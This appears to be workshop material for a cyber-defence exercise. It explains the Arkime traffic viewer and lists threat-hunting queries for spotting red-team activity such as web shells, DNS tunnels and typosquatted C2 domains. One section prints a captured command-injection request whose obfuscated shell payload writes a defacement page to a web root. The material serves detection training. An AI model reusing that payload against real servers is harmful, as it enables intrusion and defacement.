# Using the viewer

Arkime viewer already includes comprehensive documentation under `/help` url, aka *the owl logo*. This section only serves to provide some context and examples. **Please refer to official docs for up-to-date reference for field types, supported expressions, etc**.

See your `singlehost` VM Arkime installation for `/help`
 * http://<singlehost-ip>:8005/help

## Viewer tabs

### Sessions

The first and most important tab for digging into individual sessions and opening the pcap payload view. Metadata is presented in session headers while payload is loaded directly from disk. Visible columns in un-expanded view can be configured on top-left corner.

### SPI View

Lets you see indexed fields per database category. Useful for quickly identifying suspicious or interesting indexed fields. For example, applying search expression `http.user-agent == *echo*` and then expanding `User Agant` field in `HTTP` tab reveals a concise list of malicious scripts seen in web traffic (also, *php*, *js*, *cat*, and other systems commands which should not be seen in a user-agent). Useful also for exploring all the available fields, for there are many.

### SPI Graph

Provides a time-series aggregation per selected field. Useful when looking for suspicious peaks, drop-offs, etc. Or simply when one is not sure what to look for. For example, strange peak in `Protocols` aggregation may reveal a peak of DNS traffic. After applying `protocols == dns` filter, we can dig into `dns.status`, `ip.src` or `ip.dst` fields to identify strange hosts.

### Connections

For visualizing *who talks to who* for source and destination field pairs. For example, compromised hosts and their respective CnC servers, DNS resolution trees, finding cross-subnet connections, etc. Data points are sampledto avoid killing your browser. Thus, picture quality depends on how well you narrowed down the search.

### Hunt

May need to be explicitly enabled for users. Relatively new addition which allows for searching in packets on disk pcap files, as opposed to querying indexed fields in elastic. In other words, packet grep. Allows for string and regex searches, but can be quite expensive with large datasets. Thus, a good session filter should be set to avoid excessive IO load or overly long searches.

For example, powershell commands (or any other script) can be executed over http. This may not be visible on indexed HTTP fields, but becomes obvious after opening the packet payload view. Searching for the `encodedcommand` string in http sessions between windows workstation may therefore reveal base64 encoded powershell scripts executed over the wire.

### Files

List of indexed pcap files in filesystem, their sise, and weather they are open for writing. System administration info.

### Stats

Capture and Elasticsearch statistics. Vital for administration, especially in high-bandwidth environment. Not so important for hunting.

### History

Query history for the user. User activity auditing for admins.

### Settings

Admin tab for various things. Like changing the interface theme (dark more, anyone?). 

Useful for hunting because cron queries can be configured here. So, peridic queries and alert in the pocket? Yes, please!

### Users

User administration tab. Various user account limitations can be can be configured here. For example, enabling hunt tab, allowing for searching in email traffic, applying forced view limitations via query, etc.

## Tasks

**NB! These tasks are meant to be performed on real cyber exercise data (not simulated traffic in `singlehost` VM). Please wait for the instructors to provide credentials and guidelines on accessing the Exercise Arkime environment.**

 * Find plaintext HTTP on port 443;
 * Sometime there's no data in a session. Filter for traffic that contains data;
 * Investigate time-series data per gamenet host (pick some hosts of interest);
 * Drill down to specific protocols (HTTP, SMB, TLS, etc.);
 * Investigate traffic between workstations, don't forget IPv6;
 * Filter only traffic for your team;

If you are done with those, more tasks might be available from the instructors.


# API

[Arkime v3 API reference](https://arkime.com/apiv3)

As you soon discover, manual search does not really scale and interesting findings can be surprisingly difficult to reproduce. And all those fields, protocols, teams, subnets...if only we could *for loop* it somehow...

Viewer is nothing more than HTTP endpoint behind digest authentication that aggregates data from elastic. So, why not send HTTP GET requests for listing interesting stuff.

# Hunting trip

## Hunting samples from 2022 and 2023

### Zip file downloads

`http.uri == *.zip`

* lot of benight stuff, including antivirus deployments;
* suspicious strings sometimes visible in payload (`FreePr0n.bat`);
* unique listing is your friend;
* files can be downloaded;
* failed unzip still reveals file listing even if fails with password protection;

### Web request to double extention file

`http.uri == *.jpg.php`

* PHP script mimicing a PNG image;
* preplanted backdoor (sample results 404, so likely cleaned up);
* filenames themselves can be suspisicous;
* somestimes RT does not bother with domain and goes directly for the IP;

### Malicious command injection

`http.uri == *api.php && http.request.content-type == application/json && http.method == POST && http.statuscode == 200`

```
POST /api.php HTTP/1.1
Host: REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 361
Content-Type: application/json

{"ip": "8.8.8.8; /''??r/?i?''/''e?h?'' PHAgc3R5bGU9dG9wOjA7bGVmdDowO2JhY2tncm91bmQ6YmxhY2s7Y29sb3I6bGltZTtwb3NpdGlvbjpmaXhlZDt6LWluZGV4Ojk5OTk7Zm9udC1zaXplOjZlbTt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO2Rpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcjs+Tm8gbW9yZSBmb3NzaWwgZnVlbHM8L3A+Cg== | /??r/??n/???e64 -''d > /v?r/w??''/''h??l''/index.html"}
HTTP/1.1 200 OK
Date: Wed, 19 Apr 2023 06:48:10 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 380
Connection: close
Content-Type: application/json; charset=utf-8

{"output":"PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=54 time=3.89 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=54 time=3.29 ms\n64 bytes from 8.8.8.8: icmp_seq=3 ttl=54 time=3.46 ms\n\n--- 8.8.8.8 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2004ms\nrtt min\/avg\/max\/mdev = 3.290\/3.545\/3.887\/0.251 ms\n"}

```

* query itself is a lucky hit;
* real meat is in the payload;
* successful command injection;
* data sanitation vulnerability;
* no need to decode payload, clearly just calling for ping;
* no need to drop tables to prove a point;

### Successful large body HTTP Post to php file

`http.uri == *php && http.method == POST && http.statuscode == 200 && bytes.src > 100000`

* POST body *is* a PHP file;
* seems to be a web shell upload;

### RT C2 domain examples

```
*.gstatlc.net
*.scdn.co.uk
*.rnicrosoftonline.net
*.mozllla.com
*.awsamazon.eu
*.msn365.org
*.braveapi.com
```

* notice how all domains look kinda legit, but not really;
* mozilla with 3 L-s, rnicrosoft instead of microsoft;
* with some fonts `rn` looks exactly like `m`;
* used by cobalt strike to embed callback into payload;
* IP gets blocked -> swap IP -> update A record -> malware calls home again;
* list newly discovered domain -> loop NS query for all of them -> authoritative server in gamenet;
    * extra points -> A record for malicious subdomain is `0.0.0.0` -> confirmed cobalt strike response;
    * in 2024 this was only used for initial IP resolution though, likely by preplanted malware;

### TCP DNS tunnel on port 53

`port == 53 && protocols != dns && databytes == 0 && bytes > 100000`

* non-standard protocol on well known port;
    * could be a parsing issue as well;
* large amount of data;
* using bytes (all data, including headers) instead of databytes (payload) is because non-standard traffic fools parsers;

### plaintext HTTP communication from target to unknown IP (RT)

`country.src == 21 && country.dst != 21 && port.dst == 80 && packets >  10 && http.uri == "*\?r=*"`

* Tool attribution `http.cookie.key == filegator` - https://github.com/filegator/filegator;
* IPv4 hostname;
* Looks like RT C2 or exfiltration server;

### SSH on Port 443

`port == 443 && protocols == ssh`

* known protocol on non-standard port;
* no need to see inside traffic to detect malicious activity;
* can be used as *collector query* to find malicious IP-s and pivot to looking into those;

### whatzapp.eu served from SimpleHTTPServer

`host ==  *.whatzapp.eu`

* mimicing a real domain, though can identified with human reasoning;
* served by default python server - convenient for RT;
* payload reveals a lot of info, such as affected user and RT actions;
    * looks to be a php web shell delivery;

### Seach for political statements for defacement attempts

`http.uri == *stealing*black*market*`

* Logic could be used to generate queries to find defacements;

### Lala.exe

`http.uri == *lala.exe`

* suspicious filename;
* example from Estonian team was dropped by squid proxy - no impact;
* unique listing of EXE files can reveal a lot;

## RT sessions in the classroom

 * We might have someone from various RT sub-teams brief us on their activities during the previous Exercise.
 * Pay attention to: Which machines were involved? When was the attack conducted? Which protocols were used? Was it encrypted or not?
 * Takes notes! This information might be useful later when hunting for those specific attacks/events.

## Tasks

 * Your task is to group up and go on a hunting trip. 
  * The goal, if it can be called like that, is to investigate sessions and IP addresses to identify Red team servers, compromised hosts, strange traffic patterns and possible causes, to differentiate scoring and connectivity from malicious traffic, etc. 
  * **There are no right or wrong answers, no ground truth!!!** Only traffic that is interesting and noise. 
  * **Note down your findings and possible explanations**.
  * Present your approach and findings at the end!
  * You may be called to give a status update during work. Don't be afraid to say you are stuck - other people (or instructors) around you may have ideas or suggestions to help you out.

## Some ideas and suggestions for getting started:
 * No one query nor API call will give you the whole picture, you must pivot between queries.
  * Use API to your advantage for collectiong possible indicators, then investigate by hand. Write off sessions that are not interesting, collect new indicators from those that are. Rinse and repeat.
 * Start by looking for common indicators - script tags in user-agents and URL-s, mistyped domains, strange peaks of traffic, IDS alerts, well-known protocols on non-standard ports, non-standard protocol on standardized ports, etc. Then look at involved IP addresses. Anything coming from the simulated internet? See what else has that IP doing.
 * IP addresses can be changed but may nevertheless exhibit common patterns, for example JA3 hashes, TLS certificate fingerprints, common URI patterns, cookies, etc.
 * Arkime lets you apply views and tag sessions. Use that! If something is not interesting, mark it as such and get rid of it. Whatever is left might be interesting.
 * So, you found one connection going to or coming from a CnC server...and then nothing. It may be initial compromise and interesting traffic is happening through some other IP or protocol. Are there any new streams that started exactly after that initial session?
 * What about traffic between targets and workstations? Any patterns or indicators for filtering out lateral movement?
 * Do not forget that you can also search from packets in Hunt tab. Just be sure to apply a strong expression beforehand. There's a lot of PCAPs. Let's not kill the Arkime server.
 * Have a cool idea for search but no idea how to do it in Arkime? Ask the instructurs, that's why we are here.
 * On that note, have a cool idea and making progress? Let us and others know. We can mark it down and help out everyone.
 * ...your suggestions go here...
